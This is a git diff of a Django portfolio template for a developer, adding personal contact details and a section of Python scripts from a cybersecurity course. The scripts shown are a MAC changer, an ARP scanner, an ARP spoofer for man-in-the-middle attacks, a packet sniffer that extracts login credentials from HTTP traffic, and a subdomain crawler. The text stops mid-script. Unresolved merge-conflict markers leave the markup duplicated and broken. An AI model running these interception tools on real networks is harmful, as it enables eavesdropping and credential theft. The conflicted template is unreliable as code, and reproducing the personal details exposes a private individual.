@@ -6,13 +6,13 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0" name="viewport">
 
-  <title>Personal Bootstrap Template</title>
+  <title>Jake's Portfolio</title>
   <meta content="" name="description">
   <meta content="" name="keywords">
 
   <!-- Favicons -->
-  <link href="assets/img/favicon.png" rel="icon">
-  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+  <link href="{% static 'jake_portfolio/assets/img/favicon.png' %}" rel="icon">
+  <link href="{% static 'jake_portfolio/assets/img/apple-touch-icon.png' %}" rel="apple-touch-icon">
 
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
@@ -26,7 +26,25 @@
   <link href="{% static 'jake_portfolio/assets/vendor/swiper/swiper-bundle.min.css' %}" rel="stylesheet">
 
   <!-- Template Main CSS File -->
-  <link href="{% static 'jake_portfolio/assets\css\style.css' %}" rel="stylesheet">
+  <link href="{% static 'jake_portfolio/assets/css/style.css' %}" rel="stylesheet">
+  <link href="{% static 'jake_portfolio/assets/css/portfolio.css' %}" rel="stylesheet">
+  <link href="{% static 'jake_portfolio/assets/css/portfolio_others.css' %}" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css2?family=PT+Mono&display=swap" rel="stylesheet">
+
+
+
+  <link href="https://fonts.googleapis.com/css2?family=PT+Mono&display=swap" rel="stylesheet">
+
+
+
+  <link href="https://fonts.googleapis.com/css2?family=PT+Mono&display=swap" rel="stylesheet">
+
+
+
+  <link href="https://fonts.googleapis.com/css2?family=PT+Mono&display=swap" rel="stylesheet">
+
+
 
   <!-- =======================================================
   * Template Name: Personal
@@ -43,19 +61,19 @@
   <header id="header">
     <div class="container">
 
-      <h1><a href="index.html">Jake Villamor</a></h1>
+      <h1><a href="{% url 'jake_portfolio:index' %}">Jake Villamor</a></h1>
       <!-- Uncomment below if you prefer to use an image logo -->
       <!-- <a href="index.html" class="mr-auto"><img src="assets/img/logo.png" alt="" class="img-fluid"></a> -->
-      <h2>I'm a passionate <span>graphic designer</span> from New York</h2>
+      <h2>I'm a passionate <span>programmer</span> aspiring to be a full time software/web developer.</h2>
 
       <nav id="navbar" class="navbar">
         <ul>
           <li><a class="nav-link active" href="#header">Home</a></li>
           <li><a class="nav-link" href="#about">About</a></li>
-          <li><a class="nav-link" href="index.html#resume">Resume</a></li>
-          <li><a class="nav-link" href="index.html#services">Services</a></li>
-          <li><a class="nav-link" href="index.html#portfolio">Portfolio</a></li>
-          <li><a class="nav-link" href="index.html#contact">Contact</a></li>
+          <li><a class="nav-link" href="#resume">Resume</a></li>
+          <!-- <li><a class="nav-link" href="#services">Services</a></li> -->
+          <li><a class="nav-link" href="#portfolio">Portfolio</a></li>
+          <li><a class="nav-link" href="#contact">Contact</a></li>
         </ul>
         <i class="bi bi-list mobile-nav-toggle"></i>
       </nav><!-- .navbar -->
@@ -83,35 +101,33 @@
 
       <div class="row">
         <div class="col-lg-4" data-aos="fade-right">
-          <img src="assets/img/me.jpg" class="img-fluid" alt="">
+          <img src={% static "jake_portfolio\assets\img\me.jpg" %} class="img-fluid" alt="">
         </div>
         <div class="col-lg-8 pt-4 pt-lg-0 content" data-aos="fade-left">
-          <h3>UI/UX &amp; Graphic Designer</h3>
+          <h3>Full Stack Web Developer/Python/Django</h3>
           <p class="fst-italic">
-            Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore
-            magna aliqua.
+            Hello, I'm Jake, your computer/IT guy.
           </p>
           <div class="row">
             <div class="col-lg-6">
               <ul>
-                <li><i class="bi bi-chevron-right"></i> <strong>Birthday:</strong> <span>1 May 1995</span></li>
-                <li><i class="bi bi-chevron-right"></i> <strong>Website:</strong> <span>www.example.com</span></li>
-                <li><i class="bi bi-chevron-right"></i> <strong>Phone:</strong> <span>+123 456 7890</span></li>
-                <li><i class="bi bi-chevron-right"></i> <strong>City:</strong> <span>New York, USA</span></li>
+                <li><i class="bi bi-chevron-right"></i> <strong>Birthday:</strong> <span>January 16, 1991</span></li>
+                <li><i class="bi bi-chevron-right"></i> <strong>Website:</strong> <span><a href="https://jake-villamor.onrender.com">Jake</a></span></li>
+                <li><i class="bi bi-chevron-right"></i> <strong>Phone:</strong> <span>0991 718 6723</span></li>
+                <li><i class="bi bi-chevron-right"></i> <strong>City:</strong> <span>Liloan, Cebu, Philippines</span></li>
               </ul>
             </div>
             <div class="col-lg-6">
               <ul>
-                <li><i class="bi bi-chevron-right"></i> <strong>Age:</strong> <span>30</span></li>
-                <li><i class="bi bi-chevron-right"></i> <strong>Degree:</strong> <span>Master</span></li>
-                <li><i class="bi bi-chevron-right"></i> <strong>PhEmailone:</strong> <span>email@example.com</span></li>
+                <li><i class="bi bi-chevron-right"></i> <strong>Github:</strong> <span><a href="https://github.com/yego21">yego21</a></span></li>
+                <li><i class="bi bi-chevron-right"></i> <strong>Degree:</strong> <span>Bachelor</span></li>
+                <li><i class="bi bi-chevron-right"></i> <strong>Email:</strong> <span>jakevillamor222@gmail.com</span></li>
                 <li><i class="bi bi-chevron-right"></i> <strong>Freelance:</strong> <span>Available</span></li>
               </ul>
             </div>
           </div>
           <p>
-            Officiis eligendi itaque labore et dolorum mollitia officiis optio vero. Quisquam sunt adipisci omnis et ut. Nulla accusantium dolor incidunt officia tempore. Et eius omnis.
-            Cupiditate ut dicta maxime officiis quidem quia. Sed et consectetur qui quia repellendus itaque neque. Aliquid amet quidem ut quaerat cupiditate. Ab et eum qui repellendus omnis culpa magni laudantium dolores.
+          Thanks for visiting my page, this site is still an ongoing work.
           </p>
         </div>
       </div>
@@ -193,75 +209,53 @@
       <div class="row">
         <div class="col-lg-3 col-md-4">
           <div class="icon-box">
-            <i class="ri-store-line" style="color: #ffbb2c;"></i>
-            <h3>Lorem Ipsum</h3>
+            <i class="ri-terminal-box-line" style="color: #ffbb2c;"></i>
+            <h3>Coding</h3>
           </div>
         </div>
         <div class="col-lg-3 col-md-4 mt-4 mt-md-0">
           <div class="icon-box">
-            <i class="ri-bar-chart-box-line" style="color: #5578ff;"></i>
-            <h3>Dolor Sitema</h3>
+            <i class="ri-folder-music-line" style="color: #5578ff;"></i>
+            <h3>Music</h3>
           </div>
         </div>
         <div class="col-lg-3 col-md-4 mt-4 mt-md-0">
           <div class="icon-box">
-            <i class="ri-calendar-todo-line" style="color: #e80368;"></i>
-            <h3>Sed perspiciatis</h3>
+            <i class="ri-plant-line" style="color: #e80368;"></i>
+            <h3>Nature</h3>
           </div>
         </div>
         <div class="col-lg-3 col-md-4 mt-4 mt-lg-0">
           <div class="icon-box">
-            <i class="ri-paint-brush-line" style="color: #e361ff;"></i>
-            <h3>Magni Dolores</h3>
+            <i class="ri-lightbulb-line" style="color: #e361ff;"></i>
+            <h3>Philosophy</h3>
           </div>
         </div>
         <div class="col-lg-3 col-md-4 mt-4">
           <div class="icon-box">
-            <i class="ri-database-2-line" style="color: #47aeff;"></i>
-            <h3>Nemo Enim</h3>
+            <i class="ri-robot-line" style="color: #47aeff;"></i>
+            <h3>Technology</h3>
           </div>
         </div>
         <div class="col-lg-3 col-md-4 mt-4">
           <div class="icon-box">
-            <i class="ri-gradienter-line" style="color: #ffa76e;"></i>
-            <h3>Eiusmod Tempor</h3>
+            <i class="ri-movie-2-line" style="color: #ffa76e;"></i>
+            <h3>Movies</h3>
           </div>
         </div>
         <div class="col-lg-3 col-md-4 mt-4">
           <div class="icon-box">
-            <i class="ri-file-list-3-line" style="color: #11dbcf;"></i>
-            <h3>Midela Teren</h3>
+            <i class="ri-gamepad-line" style="color: #11dbcf;"></i>
+            <h3>Video Games</h3>
           </div>
         </div>
         <div class="col-lg-3 col-md-4 mt-4">
           <div class="icon-box">
-            <i class="ri-price-tag-2-line" style="color: #4233ff;"></i>
-            <h3>Pira Neve</h3>
+            <i class="ri-brain-line" style="color: #4233ff;"></i>
+            <h3>Learning</h3>
           </div>
         </div>
-        <div class="col-lg-3 col-md-4 mt-4">
-          <div class="icon-box">
-            <i class="ri-anchor-line" style="color: #b2904f;"></i>
-            <h3>Dirada Pack</h3>
-          </div>
-        </div>
-        <div class="col-lg-3 col-md-4 mt-4">
-          <div class="icon-box">
-            <i class="ri-disc-line" style="color: #b20969;"></i>
-            <h3>Moton Ideal</h3>
-          </div>
-        </div>
-        <div class="col-lg-3 col-md-4 mt-4">
-          <div class="icon-box">
-            <i class="ri-base-station-line" style="color: #ff5828;"></i>
-            <h3>Verdo Park</h3>
-          </div>
-        </div>
-        <div class="col-lg-3 col-md-4 mt-4">
-          <div class="icon-box">
-            <i class="ri-fingerprint-line" style="color: #29cc61;"></i>
-            <h3>Flavor Nivelanda</h3>
-          </div>
+
         </div>
       </div>
 
@@ -283,58 +277,59 @@
 
       <div class="row">
         <div class="col-lg-6">
-          <h3 class="resume-title">Sumary</h3>
+          <h3 class="resume-title">Summary</h3></br></br>
           <div class="resume-item pb-0">
-            <h4>Alice Barkley</h4>
-            <p><em>Innovative and deadline-driven Graphic Designer with 3+ years of experience designing and developing user-centered digital/print marketing material from initial concept to final, polished deliverable.</em></p>
+            <h4>Jake Villamor</h4>
+            <p><em>Works well independently, or in a group setting. Can provide facets of computer support such as troubleshooting, installations,
+and maintenance. In-depth knowledge and understanding of numerous software packages. Very good analytical, logical, and
+problem solving skills. Quick learner, resourceful, innovative, mindful, and healthy. Communicates well and outstanding stress
+handling skills. Willing to be trained and eager to learn.</em></p>
             <p>
             <ul>
-              <li>Portland par 127,Orlando, FL</li>
-              <li>(123) 456-7891</li>
-              <li>alice.barkley@example.com</li>
+              <li>Sambag, San Vicente, Liloan, Cebu</li>
+              <li>(0991 718 6723)</li>
+              <li>jakevillamor222@gmail.com</li>
             </ul>
             </p>
           </div>
 
-          <h3 class="resume-title">Education</h3>
+          <h3 class="resume-title">Education</h3></br></br>
           <div class="resume-item">
-            <h4>Master of Fine Arts &amp; Graphic Design</h4>
-            <h5>2015 - 2016</h5>
-            <p><em>Rochester Institute of Technology, Rochester, NY</em></p>
-            <p>Qui deserunt veniam. Et sed aliquam labore tempore sed quisquam iusto autem sit. Ea vero voluptatum qui ut dignissimos deleniti nerada porti sand markend</p>
-          </div>
-          <div class="resume-item">
-            <h4>Bachelor of Fine Arts &amp; Graphic Design</h4>
-            <h5>2010 - 2014</h5>
-            <p><em>Rochester Institute of Technology, Rochester, NY</em></p>
-            <p>Quia nobis sequi est occaecati aut. Repudiandae et iusto quae reiciendis et quis Eius vel ratione eius unde vitae rerum voluptates asperiores voluptatem Earum molestiae consequatur neque etlon sader mart dila</p>
+            <h4>BACHELOR OF SCIENCE IN INFORMATION TECHNOLOGY</h4>
+            <h5>2007-2011</h5>
+            <p><em>Asian College of Technology</em></p>
           </div>
         </div>
         <div class="col-lg-6">
-          <h3 class="resume-title">Professional Experience</h3>
+          <h3 class="resume-title">Previous Work Experience</h3></br></br>
           <div class="resume-item">
-            <h4>Senior graphic design specialist</h4>
-            <h5>2019 - Present</h5>
-            <p><em>Experion, New York, NY </em></p>
+            <h4>Production Associate</h4>
+            <h5>2011 - 2013</h5>
+            <p><b>INNODATA KNOWLEDGE SERVICES</b></p>
+            <p><em>INCHVG IT Park Lopez Jaena St, Mandaue City</em></p>
             <p>
             <ul>
-              <li>Lead in the design, development, and implementation of the graphic, layout, and production communication materials</li>
-              <li>Delegate tasks to the 7 members of the design team and provide counsel on all aspects of the project. </li>
-              <li>Supervise the assessment of all graphic materials in order to ensure quality and accuracy of the design</li>
-              <li>Oversee the efficient use of production project budgets ranging from $2,000 - $25,000</li>
+              <li>Formatter
+• Format text-converted image files using various HTML tags.</li>
+              <li>Proofreader
+              • Ensure text integrity of formatted text files by proofreading. </li>
+              <li>Data Entry
+              • Analyze legal documents and extract the necessary information to be entered directly into the client’s database.</li>
+              <li>Styler
+              • Analyze and style legal documents in HTML format by providing divisions using customized headers for better readabilityLead in the</li>
             </ul>
             </p>
           </div>
           <div class="resume-item">
-            <h4>Graphic design specialist</h4>
-            <h5>2017 - 2018</h5>
-            <p><em>Stepping Stone Advertising, New York, NY</em></p>
+            <h4>Transaction Processor</h4>
+            <h5>2013 - 2015</h5>
+            <p><b>XEROX BUSINESS SERVICES PHILIPPINES, INC.</b></p>
+            <p><em>Skyrise 2 Building, Geonzon Street, Asiatown It Park, Cebu City, Cebu</em></p>
             <p>
             <ul>
-              <li>Developed numerous marketing programs (logos, brochures,infographics, presentations, and advertisements).</li>
-              <li>Managed up to 5 projects or tasks at a given time while under pressure</li>
-              <li>Recommended and consulted with clients on the most appropriate graphic design</li>
-              <li>Created 4+ design presentations and proposals a month for clients and account managers</li>
+              <li>Data Entry
+• Analyze documents and extract the necessary information to be entered directly into the client’s database.
+ Certificate of Recognition – Top performer for three months</li>
             </ul>
             </p>
           </div>
@@ -409,8 +404,8 @@
 
   <!-- ======= Portfolio Section ======= -->
   <section id="portfolio" class="portfolio">
-    <div class="container">
 
+    <div class="container">
       <div class="section-title">
         <h2>Portfolio</h2>
         <p>My Works</p>
@@ -419,145 +414,1843 @@
       <div class="row">
         <div class="col-lg-12 d-flex justify-content-center">
           <ul id="portfolio-flters">
-            <li data-filter="*" class="filter-active">All</li>
-            <li data-filter=".filter-app">App</li>
-            <li data-filter=".filter-card">Card</li>
-            <li data-filter=".filter-web">Web</li>
+            <li data-filter=".filter-web" class="filter-active">Web</li>
+            <li data-filter=".filter-python">Python</li>
+            <li data-filter=".filter-others">Others</li>
+              <!-- <a href="{% url 'jake_portfolio:py_scripts' %}"> -->
+
+
           </ul>
         </div>
       </div>
 
-      <div class="row portfolio-container">
 
-        <div class="col-lg-4 col-md-6 portfolio-item filter-app">
-          <div class="portfolio-wrap">
-            <img src="assets/img/portfolio/portfolio-1.jpg" class="img-fluid" alt="">
-            <div class="portfolio-info">
-              <h4>App 1</h4>
-              <p>App</p>
-              <div class="portfolio-links">
-                <a href="assets/img/portfolio/portfolio-1.jpg" data-gallery="portfolioGallery" class="portfolio-lightbox" title="App 1"><i class="bx bx-plus"></i></a>
-                <a href="portfolio-details.html" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
-              </div>
-            </div>
+
+
+<div class="row portfolio-container">
+      <div class="col-lg-12 col-md-12 portfolio-item filter-web">
+        <div class=""></br>
+            <center><img src="{% static 'jake_portfolio/assets/img/portfolio/carzone1.png' %}" alt="Sample Image" style="max-width: 80%; height: auto;"></center>
+        </div>
+        <div class="portfolio_description"></br>
+            <center><h2>Carzone</h2></center>
+            <center><p>A fully functional car selling and rental web application with very intuitive and convinient features.</p></center>
+        </div></br><hr>
+
+        <div class=""></br>
+            <center><img src="{% static 'jake_portfolio/assets/img/portfolio/carzone2.png' %}" alt="Sample Image" style="max-width: 80%; height: auto;"></center>
+        </div>
+        <div class="portfolio_description"></br>
+            <center><h2>Search Form</h2></center>
+            <center><p>Users can search according to their preferences, be it model, location, or manufacturing year.</p></center>
+        </div></br><hr>
+
+        <div class=""></br>
+            <center><img src="{% static 'jake_portfolio/assets/img/portfolio/carzone3.png' %}" alt="Sample Image" style="max-width: 80%; height: auto;"></center>
+        </div>
+        <div class="portfolio_description"></br>
+            <center><h2>Full Page Search</h2></center>
+            <center><p>Or just use the full page search feature available from anywhere in the website.</p></center>
+        </div></br><hr>
+
+        <div class=""></br>
+            <center><img src="{% static 'jake_portfolio/assets/img/portfolio/carzone4.png' %}" alt="Sample Image" style="max-width: 80%; height: auto;"></center>
+        </div>
+        <div class="portfolio_description"></br>
+            <center><h2>Send Inquiry</h2></center>
+            <center><p>Users can send inquiry about any car they may choose, site admins are instantly informed through email.</p></center>
+        </div></br><hr>
+
+        <div class=""></br>
+            <center><img src="{% static 'jake_portfolio/assets/img/portfolio/carzone5.png' %}" alt="Sample Image" style="max-width: 80%; height: auto;"></center>
+        </div>
+        <div class="portfolio_description"></br>
+            <center><h2>Dashboard</h2></center>
+            <center><p>Authenticated users have access to the dashboard and can monitor their existing inquiries.</p></center>
+        </div></br><hr>
+
+        <div class=""></br>
+            <center><img src="{% static 'jake_portfolio/assets/img/portfolio/carzone6.png' %}" alt="Sample Image" style="max-width: 80%; height: auto;"></center>
+        </div>
+        <div class="portfolio_description"></br>
+            <center><h2>Login Feature</h2></center>
+            <center><p>Login feature which not only allows users to make a Carzone account but also utilizes social login such as with Facebook and Google.</p></center>
+        </div></br><hr>
+
+        <div class=""></br>
+            <center><img src="{% static 'jake_portfolio/assets/img/portfolio/carzone7.png' %}" alt="Sample Image" style="max-width: 80%; height: auto;"></center>
+        </div>
+        <div class="portfolio_description"></br>
+            <center><h2>Contact Form</h2></center>
+            <center><p>Finally, a full featured contact form where anyone can send a message to Carzone and ask any questions they want.</p></center>
+        </div></br><hr>
+        <center><h4>Visit the website here: <a href="https://carzone-p58h.onrender.com">carzone-p58h.onrender.com</a></h4></center>
+    </div>
+
+
+    <div class="col-lg-12 col-md-12 portfolio-item filter-python">
+        <style>
+          .popup-body {
+            font-family: Arial, sans-serif;
+          }
+
+          /* Styles for the popup overlay */
+
+          @media (max-width: 750px) {
+              .popup-overlay .popup-content {
+                  width: 70%;
+                }
+              }
+
+          .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+
+          }
+
+
+          /* Styles for the popup content */
+          .popup-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #091408;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            z-index: 1001;
+            color: #ffffff;
+
+            /* Add these styles for scrolling */
+            max-height: 80%; /* Set a maximum height */
+            overflow: auto; /* Enable scrolling when content exceeds max-height */
+          }
+
+          /* Close button style */
+          .close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+          }
+
+          .green-underline-button {
+            font-family: 'PT Mono', monospace;
+            display: inline-block;
+            padding: 5px 10px;
+            font-size: 16px;
+            color: #e1e2e6;
+            background-color: transparent;
+            border: none;
+            border-bottom: 2px solid #00a859;
+            border-left: 2px solid #00a859;
+            border-right: 2px solid #00a859;
+            cursor: pointer;
+            transition: border-color 0.3s;
+          }
+
+          .green-underline-button:hover {
+            border-color: #006b3e;
+            border-bottom: 0px;
+            color: #38eb5d
+          }
+
+          .green-underline-button.right-scr {
+            border-left: 0px;
+          }
+
+          .green-underline-button.left-scr {
+            border-right: 0px;
+          }
+
+          #iframe1 {
+          display: block;
+          border: none;
+        }
+
+          .hover-iframe {
+            display: none;
+            border: none;
+          }
+
+          #python {
+            color: #18d26e;
+            font-family: 'PT Mono', monospace;
+          }
+
+<<<<<<< HEAD
+<<<<<<< HEAD
+          span h3 {
+=======
+          h3 {
+>>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
+=======
+          h3 {
+>>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
+            display: inline;
+            color: #e1e2e6;
+          }
+
+          pre {
+            font-family: 'PT Mono', monospace;
+            color: #f7f5f0;
+          }
+
+          .intro {
+            font-family: "Open Sans", sans-serif;
+            color: #f7f5f0;
+          }
+
+
+<<<<<<< HEAD
+<<<<<<< HEAD
+        </style>
+
+
+=======
+>>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
+
+        </style>
+
+
+    <div class="col-lg-12 col-md-12 portfolio-item filter-others">
+    </div>
+
+
+<<<<<<< HEAD
+>>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
+=======
+>>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
+    <div class="intro">
+      <p>Hello, this page contains scripts that I made as part of a cybersecurity course while also having to advance my Python skills and knowledges. Everything is straight out from the course except the "File Getter" script in which I made to apply and test what I've learned. Absolutely none of these scripts are made with a malicious intent and was and will never be used in such causes. Furthermore, I will never entertain any form of request from anyone asking my service that will serve for any inappropriate purposes. Thank you very much.</p>
+
+      <p>Video demos will be added soon, you can click the file buttons to view the raw python script codes.</p>
+
+    </div></br><hr>
+<center>
+<<<<<<< HEAD
+  <span><h3 id="python">Python</h3><h3> Scripts</h3></br></br></span>
+
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe1" data-popup-id="popup1">MAC Address Changer (Linux)</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe2" data-popup-id="popup2">Network Scanner</button>
+  <button class="openPopupButton green-underline-button hover-button left-scr" data-iframe-id="iframe3" data-popup-id="popup3">ARP Spoofer (MITM Attack) <-</button>
+  <button class="openPopupButton green-underline-button hover-button right-scr" data-iframe-id="iframe4" data-popup-id="popup4">-> Packet Sniffer (While MITM)</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe5" data-popup-id="popup5">Website Crawler</button>
+  <button class="openPopupButton green-underline-button hover-button left-scr" data-iframe-id="iframe6" data-popup-id="popup6">Port Listener <-</button>
+  <button class="openPopupButton green-underline-button hover-button right-scr" data-iframe-id="iframe7" data-popup-id="popup7">-> Remote Backdoor</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe7" data-popup-id="popup8">Keylogger</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe8" data-popup-id="popup9">File Getter</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe9" data-popup-id="popup10">Vulnerability Scanner</button></br></br>
+  <h3 id="python">Python</h3><h3> Scripts</h3></br></br>
+
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe1" data-popup-id="popup1">MAC Address Changer (Linux)</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe2" data-popup-id="popup2">Network Scanner</button>
+  <button class="openPopupButton green-underline-button hover-button left-scr" data-iframe-id="iframe3" data-popup-id="popup3">ARP Spoofer (MITM Attack)</button>
+  <button class="openPopupButton green-underline-button hover-button right-scr" data-iframe-id="iframe4" data-popup-id="popup4">Packet Sniffer (While MITM)</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe5" data-popup-id="popup5">Website Crawler</button>
+  <button class="openPopupButton green-underline-button hover-button left-scr" data-iframe-id="iframe6" data-popup-id="popup6">Port Listener</button>
+  <button class="openPopupButton green-underline-button hover-button right-scr" data-iframe-id="iframe6" data-popup-id="popup6">Remote Backdoor</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe7" data-popup-id="popup7">Keylogger (via email report)</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe8" data-popup-id="popup8">File Getter</button>
+  <button class="openPopupButton green-underline-button hover-button" data-iframe-id="iframe9" data-popup-id="popup9">Vulnerability Scanner</button></br></br>
+>>>>>>> dd814750ab818c4531665ef8fe83f31c96fac091
+</center>
+
+
+  <!-- Popup overlay -->
+
+
+
+  <div class="popup-overlay" id="popup1">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup1">&times;</span>
+      <pre id="popup1Content">
+
+              <--------------------------------- MAC CHANGER ------------------------------------>
+
+
+        #!/usr/bin/env python
+
+        import subprocess
+        import optparse
+        import re
+
+
+        def get_args():
+
+            parser = optparse.OptionParser()
+            parser.add_option("-i", "--interface", dest="interface", help="select interface")
+            parser.add_option("-m", "--mac", dest="new_mac", help="Enter new MAC address")
+            parser.add_option("--show all", dest="show_int", help="Display all network interfaces.")
+            (opts, args) = parser.parse_args()
+
+
+            if not opts.interface:
+                 parser.error("Please input interface, type --help for more details")
+            elif not opts.new_mac:
+                parser.error("Please input new MAC address, type --help for more details")
+
+            return opts, args
+
+        def change_mac(interface, new_mac):
+            subprocess.call(["ifconfig", interface, "down"])
+            subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
+            subprocess.call(["ifconfig", interface, "up", ])
+            print("[+] Changing MAC Address to " + new_mac)
+
+
+        def get_current_mac(interface):
+            show_ifconfig = subprocess.check_output(["ifconfig", interface])
+            mac_regex = '\w\w:\w\w:\w\w:\w\w:\w\w:\w\w'
+            ifconfig_mac = re.search(mac_regex, str(show_ifconfig))
+            if ifconfig_mac:
+                return ifconfig_mac.group(0)
+
+            else:
+                print("Could not read MAC Address.")
+
+
+        current_mac = get_current_mac(opts.interface)
+        print("Current MAC Address " + str(current_mac))
+        change_mac(opts.interface, opts.new_mac)
+
+        current_mac = get_current_mac(opts.interface)
+        if current_mac == opts.new_mac:
+            print("[+] Address successfully changed to" + opts.new_mac)
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup2">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup2">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- NETWORK SCANNER ------------------------------------>
+<<<<<<< HEAD
+
+
+        #!usr/bin/python/env
+
+        import scapy.all as scapy
+        import scapy.layers.l2 as scapyA
+        import optparse
+
+
+        def get_arguments():
+            parser = optparse.OptionParser()
+            parser.add_option("-t", "--target", dest="target", help="Target IP/Client")
+            options = parser.parse_args()[0]
+            return options
+
+        def scan(ip):
+            arp_request = scapyA.ARP(pdst=ip)
+            broadcast = scapyA.Ether(dst="ff:ff:ff:ff:ff:ff")
+            # scapy.ls(scapyA.ARP())
+            arp_broadcast_request = broadcast/arp_request
+            answered_list = scapyA.srp(arp_broadcast_request, timeout=1)[0]
+            # print(answered.summary())
+
+
+            client_list=[]
+            for e in answered_list:
+                # print(e)
+                # print(e[1].psrc+"\t\t"+e[1].hwsrc)
+                client_dict={"IP":e[1].psrc, "MAC Address":e[1].hwsrc}
+                client_list.append(client_dict)
+                # print("================================+++++++++++++++++++++++++++++++++++++++++++===============================")
+
+            return(client_list)
+        def print_result(result_list):
+            print("IP\t\t\tMAC Address\n=======================================================================================")
+            for client in result_list:
+                print(client["IP"]+"\t\t"+client["MAC Address"])
+
+        target_client = get_arguments()
+        scan_result = scan(target_client.target)
+        print_result(scan_result)
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup3">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup3">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- ARP SPOOFER --------------------------------->
+
+
+        #!usr/bin/python/env
+        import sys
+        import scapy.all as scapy
+        import scapy.layers.l2 as scapyA
+        import optparse
+        import time
+        import os
+
+        def spoof(target_IP, spoof_IP):
+            target_mac = get_mac((target_IP))
+            packet = scapyA.ARP(op=2, pdst=target_IP, hwdst=target_mac, psrc=spoof_IP)
+            print(target_mac+"\n")
+            scapy.send(packet, verbose=False)
+
+        def restore(dest_IP, source_IP):
+            dest_MAC = get_mac((dest_IP))
+            source_MAC = get_mac(source_IP)
+            packet = scapyA.ARP(op=2, pdst=dest_IP, hwdst=dest_MAC, psrc=source_IP, hwsrc=source_MAC)
+            scapy.send(packet, count=4, verbose=False)
+
+
+        def get_mac(target_IP):
+            arp_req = scapyA.ARP(pdst=target_IP)
+            broadcast = scapyA.Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_broadcast_req = broadcast/arp_req
+            answer = scapyA.srp(arp_broadcast_req, timeout=1, verbose=False)[0]
+
+            for e in answer:
+                  mac = e[1].hwsrc
+                  return mac
+
+        target_IP = "192.168.46.129"
+        gateway_IP = "192.168.46.2"
+
+        sent_packets = 0
+        try:
+            while True:
+                spoof(target_IP, gateway_IP)
+                spoof(gateway_IP, target_IP)
+                sent_packets = sent_packets + 2
+                print("\r[+] Packets sent: " + str(sent_packets), end="")
+                sys.stdout.flush()
+                time.sleep(2)
+        except KeyboardInterrupt:
+            print("\n Ctrl + C pressed, Resetting ARP Table, please wait...")
+            restore(target_IP, gateway_IP)
+            restore(gateway_IP, target_IP)
+
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup4">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup4">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- PACKET SNIFFER ------------------------------------>
+
+
+        #! usr/bin/env python
+        import scapy.all as scapy
+        from scapy.layers import http
+        import scapy.utils as scapyU
+
+        def sniff(interface):
+            scapy.sniff(iface=interface, store=False, prn=sniff_packet)
+
+        def get_url(packet):
+            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+            return url
+
+        def get_login_info(packet):
+            if packet.haslayer(scapy.Raw):
+                keywords = ["User", "Username", "Password", "Login", "login", "un", "pass"]
+                load = str(packet[scapy.Raw].load)
+                for keyword in keywords:
+                    if keyword in load:
+                        return load
+
+        def sniff_packet(packet):
+
+            if packet.haslayer(http.HTTPRequest):
+                url = get_url(packet)
+                login_info = get_login_info(packet)
+                print("[+] HTTP Request >>" + str(url))
+                print("Possible Login Information: " + str(login_info))
+
+        sniff("eth0")
+
+
+
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup5">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup5">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- WEBSITE CRAWLER ------------------------------------>
+
+
+        #!usr/bin/python/env
+        import requests, urllib.parse, re
+
+        def get_response(url):
+            try:
+                req = requests.get(url)
+                if req.status_code == requests.codes.ok:
+                    print(requests.get(url))
+                    return req
+            except requests.exceptions.ConnectionError:
+                pass
+
+        url = "hackthissite.org"
+        with open ("subdomains.txt", "r") as wordlist:
+            for word in wordlist:
+                word = word.strip()
+                test_url = "http://" + word + "." + url
+                result = get_response(test_url)
+                if result:
+                    print("[+] Discovered subdomain --> " + test_url)
+
+        dir_url = "192.168.46.128"
